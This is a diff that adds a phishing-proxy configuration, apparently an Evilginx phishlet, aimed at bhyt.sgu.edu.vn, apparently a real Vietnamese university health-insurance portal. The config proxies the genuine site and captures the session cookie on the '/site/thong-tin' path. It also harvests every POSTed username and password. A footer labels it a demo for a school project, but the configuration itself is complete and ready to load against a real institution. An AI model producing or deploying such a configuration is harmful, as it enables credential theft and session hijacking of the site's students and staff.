@@ -242,3 +242,35 @@ login:
   domain: thongtindaotao.daihocsaigon.edu.vn
   path: /
 ```
+
+```
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: "", orig_sub: "", domain: "bhyt.sgu.edu.vn", session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: "bhyt.sgu.edu.vn", orig_sub: "", domain: "bhyt.sgu.edu.vn", search: "bhyt.sgu.edu.vn", replace: "bhyt.sgu.edu.vn", mimes: ["text/html", "application/javascript", "application/json"]}
+  - {triggers_on: "bhyt.sgu.edu.vn", orig_sub: "", domain: "bhyt.sgu.edu.vn", search: "</body>", replace: "<p style='text-align: center;'>Demo được thực hiện nhằm mục đích làm đồ án</p></body>", mimes: ["text/html", "application/javascript", "application/json"]}
+
+auth_tokens:
+  - domain: bhyt.sgu.edu.vn
+    path: '/site/thong-tin'
+    name: 'cookie'
+    header: 'cookie'
+    type: 'http'
+
+credentials:
+  username:
+    key: "username"
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: "password"
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'bhyt.sgu.edu.vn'
+  path: ''
+```
